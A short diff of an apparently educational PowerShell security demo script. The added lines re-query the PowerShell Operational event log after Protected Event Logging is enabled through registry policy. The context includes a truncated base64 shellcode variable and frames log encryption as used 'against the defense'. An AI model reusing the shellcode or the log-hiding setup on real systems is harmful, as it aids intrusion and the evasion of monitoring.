@@ -161,8 +161,12 @@ $B64_ShellCode = '/OiJAAAAYInlMdJki1Iwi1IMi1IUi3IoD7dKJjH/McCsPGF8Aiwgwc8NAcfi8F
 ($bytes |  foreach { $_.ToString("X2") }) -join ""
 
 # 9. Use Protected Event Logging against the defense (need to create a Document Encryption cert first)
+# before
 Get-WinEvent -FilterHashtable @{logname='Microsoft-Windows-PowerShell/Operational'} -MaxEvents 10
 Get-WinEvent -FilterHashtable @{logname='Microsoft-Windows-PowerShell/Operational'} -MaxEvents 1 | select -expandProperty message
 New-Item "HKLM:\Software\Policies\Microsoft\Windows\EventLog\ProtectedEventLogging" -Force
 Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows\EventLog\ProtectedEventLogging" -Name EnableProtectedEventLogging -Value 1
 Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows\EventLog\ProtectedEventLogging" -Name EncryptionCertificate -Value (dir Cert:\CurrentUser\my)[0].Thumbprint
+# run some code, then look again @ the event log
+Get-WinEvent -FilterHashtable @{logname='Microsoft-Windows-PowerShell/Operational'} -MaxEvents 10
+Get-WinEvent -FilterHashtable @{logname='Microsoft-Windows-PowerShell/Operational'} -MaxEvents 1 | select -expandProperty message
